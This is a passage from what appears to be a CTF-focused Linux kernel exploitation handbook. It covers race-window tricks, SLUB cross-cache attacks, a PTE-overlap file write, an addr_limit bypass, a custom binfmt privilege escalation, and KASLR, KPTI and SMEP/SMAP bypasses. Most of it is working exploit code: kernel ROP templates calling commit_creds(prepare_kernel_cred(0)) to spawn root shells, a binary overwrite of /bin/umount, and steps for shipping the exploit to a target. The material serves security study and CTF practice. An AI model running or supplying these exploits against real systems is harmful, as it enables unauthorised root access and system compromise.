int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = {.api = UFFD_API,.features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {.range = {.start = (unsigned long)region,.len = 0x1000 },.mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = {.fd = uffd,.events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {.dst = msg.arg.pagefault.address & ~0xFFF,.src = (unsigned long)src_page,.len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**Split object over two pages:** Place a kernel object so it spans a page boundary. The first page is normal; the second triggers uffd. The kernel processes the first half, then blocks on the second half - the race window occurs mid-operation.

### Alternative Race Techniques (uffd Disabled)

When `CONFIG_USERFAULTFD` is disabled or uffd is restricted to root:

1. **Large `copy_from_user()` buffer:** Pass an enormous buffer to slow down the copy operation, widening the race window
2. **CPU pinning + heavy syscalls:** Pin racing threads to the same core; use heavy kernel functions to extend the timing window
3. **Repeated attempts:** Pure race without stabilization - run exploit in a loop. Success rate varies (1% to 50% depending on timing)
4. **TSC-based timing (Context Conservation):** Loop checking TSC (Time Stamp Counter) before entering the critical section to confirm execution is at the beginning of its CFS timeslice - reduces scheduler preemption during the race

---

## SLUB Allocator Internals

### Freelist Pointer Hardening

Since kernel 5.7+, free pointers in SLUB objects are placed in the **middle** of the object (word-aligned), not at offset 0:

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**Impact:** Simple buffer overflows from the start of a freed chunk cannot reach the free pointer. Underflows from adjacent chunks may still work.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)

When enabled, free pointers are XOR-obfuscated with a per-cache random value:

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**Detection:** In GDB, find `kmem_cache_cpu` (via `$GS_BASE + kmem_cache.cpu_slab` offset), follow the `freelist` pointer, and check if the stored values look like valid kernel addresses. If not, obfuscation is active.

---

## Leak via Kernel Panic

When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:

```nasm
jmp &flag; jump to the address of the flag file content in memory
```

The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section - these bytes are the flag content.

**Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.

---

## Race Window Extension via MADV_DONTNEED + mprotect

**Pattern:** Kernel module has a TOCTOU race between check and delete paths, but the window is too narrow to hit reliably. Extend the race window from milliseconds to dozens of seconds by forcing repeated page faults during the long-running kernel operation.

**Technique:**
1. Map memory used by the kernel check operation (e.g., `sha256_va_range()` reading userland pages)
2. From a second thread, loop `MADV_DONTNEED` (drops page table entries) + `mprotect()` (toggles permissions)
3. Each fault during the kernel's hash computation forces VMA lock acquisition and page fault handling
4. The kernel operation stalls repeatedly, keeping the race window open

```c
// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window by forcing repeated faults
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
}

// Thread 3: trigger the concurrent DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
```

**Key insight:** `MADV_DONTNEED` drops page table entries without freeing the underlying pages. When the kernel next accesses that userland memory (e.g., during a hash computation), it faults and must re-establish the mapping. Combined with `mprotect()` toggling, this creates lock contention that extends any kernel operation touching userland pages from sub-millisecond to tens of seconds — turning impractical race conditions into reliable exploits.

---

## Cross-Cache Attack via CPU-Split Strategy

**Pattern:** Vulnerable object is in a dedicated SLUB cache (not `kmalloc-*`), preventing standard same-cache reclaim after a double-free. Force pages out of the dedicated cache into the buddy allocator by splitting allocation and deallocation across CPUs.

**Technique:**
1. **Allocate N objects on CPU 0** — fills slab pages on CPU 0's partial list
2. **Free the same objects from CPU 1** — freed objects go to CPU 1's partial list (not CPU 0's)
3. CPU 1's partial list overflows to the **node partial list**
4. Completely empty slabs are released to the **PCP (per-CPU page) list**, then to the **buddy allocator**
5. Reallocate those pages as a different object type (e.g., page tables)

```c
// Pin allocation thread to CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin free thread to CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// Free from different CPU — objects land on CPU 1's partial list
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
```

**Key insight:** SLUB allocates and frees per-CPU. When an object is freed on a different CPU than where it was allocated, it enters a different partial list. When that list overflows, empty slabs are returned to the buddy allocator — escaping the dedicated cache entirely. This enables cross-cache attacks even against custom `kmem_cache_create()` caches that are immune to standard heap spray.

---

## PTE Overlap Primitive for File Write

**Pattern:** After reclaiming a freed page as a PTE (page table entry) page, overlap an anonymous writable mapping and a read-only file mapping so both are backed by the same physical page via corrupted PTEs.

**Technique:**
1. Trigger cross-cache double-free to get a page into the buddy allocator
2. Allocate a new anonymous mapping — kernel uses the freed page as a PTE page
3. Map a read-only file (e.g., `/bin/umount`) into the same PTE region
4. The corrupted PTE page now has entries pointing to the file's physical pages
5. Write through the anonymous (writable) mapping → modifies the file's pages directly
6. Overwrite the file's shebang/header to execute an attacker-controlled script

```c
// After cross-cache frees page into buddy allocator:

// 1. Anonymous mapping reclaims the page as PTE storage
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch pages to populate PTEs in the reclaimed page
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. File mapping into overlapping virtual range
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. Write through anonymous side corrupts file content
// Overwrite ELF header / shebang with #!/tmp/pwn
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. Execute the corrupted binary → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

**Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.

---

## Kernel addr_limit Bypass via Failed File Open

**Applies to Linux < 5.18 on x86** (set_fs()/addr_limit was removed in 5.18; earlier on arm64/powerpc). Modern kernels use `access_ok()` + `copy_{to,from}_user()` without a per-thread `addr_limit`.

**Pattern:** Kernel module calls `set_fs(KERNEL_DS)` to access userspace pointers, but if a subsequent file open fails, it returns without restoring the old `addr_limit`. Force the failure by making the target file a directory. Now user-space `read()` can access kernel memory.

**Exploitation strategy:**
1. The kernel module has a debug function that sets `addr_limit = KERNEL_DS` to read a debug file
2. If `filp_open()` fails (e.g., target is a directory, not a file), the error path returns early
3. The error path does NOT restore `addr_limit` to its previous value (`USER_DS`)
4. The calling process now has `addr_limit = KERNEL_DS` permanently
5. Ordinary `read()`/`write()` syscalls can now access kernel memory addresses
6. Use this to overwrite syscall table entries with `prepare_kernel_cred`/`commit_creds`

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define DEBUG_FILE "/tmp/debug_log"
#define SYS_TABLE_ADDR 0xffffffff81801400  // from /proc/kallsyms

// Step 1: Make debug file a directory -> filp_open() fails with -EISDIR
mkdir(DEBUG_FILE, 0);

// Step 2: Trigger the kernel module's debug function
int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);  // Triggers debug_msg(), leaves addr_limit = KERNEL_DS

// Step 3: Now read()/write() can access kernel memory
// Use pipe as a kernel-memory read/write primitive:
int pipefd[2];
pipe(pipefd);

// Write prepare_kernel_cred address to syscall 100
unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));

// Write commit_creds address to syscall 101
unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
write(pipefd[1], &cc_addr, sizeof(cc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));

// Step 4: Call the overwritten syscalls to get root
int creds = syscall(100, 0);   // prepare_kernel_cred(0)
syscall(101, creds);            // commit_creds(creds)
// Now running as root
system("/bin/sh");
```

**Key insight:** When a kernel module sets `addr_limit` to `KERNEL_DS` for kernel pointer access but fails to restore it on error paths, userspace processes retain the elevated `addr_limit`. This turns ordinary `read()`/`write()` syscalls into kernel memory read/write primitives. Always audit kernel module error paths for missing `set_fs()` restoration - triggering the error (e.g., making a file path point to a directory) is often trivial.

---

## Custom binfmt Loader OOB Read + clear_user for Privesc

**Pattern:** Kernel module `p4fmt.ko` registers a new `binfmt` handler for files starting with `"P4"`. The loader reads a user-controlled header: `{magic, version, arg, load_count, header_offset, entry}` followed by `load_count` `{addr, length, offset}` entries. Two missing checks make this a full privesc primitive: `header_offset` is used unvalidated as a pointer offset into `bprm->buf[]` (OOB read of the kernel-side `linux_binprm` struct, including `struct cred *cred`), and `loads[i].addr | 8` selects a branch that calls `_clear_user(addr, length)` with fully attacker-controlled arguments — an arbitrary zeroing primitive that runs *before* `install_exec_creds()` commits `bprm->cred`.

```python
from pwn import *

# Stage 1: leak bprm->cred via OOB header_offset into the kernel-side linux_binprm buffer.
# load_count=5, header_offset=0x80-0x18 -> loads[] parsed from fields past bprm->buf.
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# Execute -> dmesg "vm_mmap(..., length=<cred_addr>,...)" reveals the cred pointer.

# Stage 2: zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid in bprm->cred via clear_user.
# arg=1 with load entries whose addr has bit 3 set -> kernel calls _clear_user(addr, length).
cred = 0xffff...          # from leak
entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap RWX page for shellcode
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
# exec -> install_exec_creds sees a cred with uid=0 -> root shell (drop_privileges bypass)
```

**Key insight:** Custom `binfmt_misc`-style loaders are a fertile target because they parse attacker-supplied headers *before* `install_exec_creds` commits the per-exec credential struct. Any primitive that touches `bprm` in that window (OOB read to leak `bprm->cred`, arbitrary `_clear_user` to zero cred fields, `vm_mmap` with controlled flags/prot for kernel-aided RWX) composes into privesc without needing a traditional kernel memory-corruption chain. Always audit `load_*_binary` functions in custom modules for (a) bounds on header offsets and counts, (b) `access_ok`/range checks on `addr`/`length` arguments passed to `_clear_user`/`copy_to_user`, and (c) side-channel info leaks via `printk`.

---

## KASLR and FGKASLR Bypass

### KASLR Bypass via Stack Leak

Leak a kernel text pointer from the stack to compute the KASLR (Kernel Address Space Layout Randomization) slide:

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**Other KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- Kernel oops messages (if oops doesn't panic)
- UAF reading freed kernel objects containing text pointers
- `modprobe_path` has 1-byte entropy — brute-forceable with AAW

### FGKASLR Bypass

FGKASLR (Function Granular KASLR) randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.

**Method 1: Use only unaffected `.text` gadgets**

```bash
# Find gadgets only in the non-randomized range
ropr -no-uniq -R "^pop rdi; ret;|^swapgs"./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.

**Method 2: Resolve randomized functions via `__ksymtab`**

`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
//...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.

---

## KPTI Bypass Methods

KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:

### Method 1: swapgs_restore Trampoline

The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp;... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.

### Method 2: Signal Handler (SIGSEGV)

Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.

### Method 3: modprobe_path via ROP

Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.

See [modprobe_path Overwrite](#modprobe_path-overwrite) for the full technique, trigger sequence, and ROP payload.

### Method 4: core_pattern via ROP

Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.

See [core_pattern Overwrite](#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.

---

## SMEP / SMAP Bypass

**SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
- **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred-commit_creds).

**SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
- **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.

**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.

---

## KPTI / SMEP / SMAP Quick Reference

| Protection | Blocks | Bypass |
|-|-|-|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred-commit_creds) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](#ret2usr-no-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |

See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.

---

## GDB Kernel Module Debugging

Load vulnerable kernel module symbols in GDB for source-level debugging:

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.

---

## Initramfs and virtio-9p Workflow

**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o./share/exploit
```

**Extract and modify initramfs:**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find. -print0 | cpio -null -ov -format=newc | gzip -9 >../initramfs.cpio.gz
```

**Key modifications to `/init` for debugging:**
- Comment out `exec su -l ctf` (or similar) to keep root privileges
- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses

---

## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**Finding core_pattern:**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

## Exploit Templates

### Full Kernel ROP Template (SMEP + KPTI)

Complete exploit for kernel stack overflow with SMEP and KPTI enabled:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// Addresses from vmlinux (apply KASLR offset if needed)
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// Userland state
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;": [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // Step 1: Leak canary + KASLR base
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // Step 2: Apply KASLR offset
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // Step 3: Build ROP chain
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx padding
    payload[off++] = commit_creds;

    // KPTI-safe return to userland
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // padding
    payload[off++] = 0;  // padding
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```

### ret2usr Template (No SMEP/SMAP)

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;":: [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## Exploit Delivery

Kernel exploits are typically large static binaries. Minimize size for remote delivery:

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx -best exploit
```

**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).
